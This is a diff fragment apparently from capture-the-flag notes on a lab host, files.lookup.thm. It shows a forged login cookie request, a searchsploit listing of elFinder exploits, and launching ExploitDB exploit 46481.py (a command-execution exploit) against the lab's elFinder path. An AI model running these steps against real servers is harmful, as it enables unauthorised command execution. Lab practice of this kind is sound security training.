@@ -364,7 +364,30 @@ Note: Unnecessary use of -X or --request, POST is already inferred.
 
 http --session=auth_session GET http://files.lookup.thm/ Cookie:"login_status=success"
 
+# exploitDB
 
+──(root㉿vbox)-[/usr/…/exploitdb/exploits/php/webapps]
+└─# searchsploit elfinder 2. 
+4------------------------------------------- ---------------------------------
+ Exploit Title                             |  Path
+------------------------------------------- ---------------------------------
+elFinder 2 - Remote Command Execution (via | php/webapps/36925.py
+elFinder 2.1.47 - 'PHP connector' Command  | php/webapps/46481.py
+elFinder PHP Connector < 2.1.48 - 'exiftra | php/remote/46539.rb
+elFinder PHP Connector < 2.1.48 - 'exiftra | php/remote/46539.rb
+elFinder Web file manager Version - 2.1.53 | php/webapps/51864.txt
+------------------------------------------- ---------------------------------
+Shellcodes: No Results
+                                                                             
+┌──(root㉿vbox)-[/usr/…/exploitdb/exploits/php/webapps]
+└─# ./46481.py
+  File "/usr/share/exploitdb/exploits/php/webapps/./46481.py", line 34
+    print "Usage: python exploit.py [URL]"
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
+
+
+# exploit
        
 ┌──(root㉿vbox)-[/usr/…/exploitdb/exploits/php/webapps]
 └─# python2 ./46481.py http://files.lookup.thm/elFinder
